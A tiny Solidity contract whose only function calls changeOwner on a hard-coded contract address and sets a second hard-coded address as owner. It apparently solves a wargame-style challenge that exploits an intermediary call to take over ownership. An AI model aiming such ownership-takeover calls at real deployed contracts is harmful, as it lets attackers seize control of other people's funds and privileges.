// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface ChangeOwner {
    function changeOwner(address _owner) external;
}

contract CallOwner {
    function changeOwnercall() public {
         ChangeOwner(0xf027a076A9dA63d509381c50B030d953c8ea25E1).changeOwner(0x58961e4aD6046F830290aE5264e63Cf8b960e181);
    }
   
}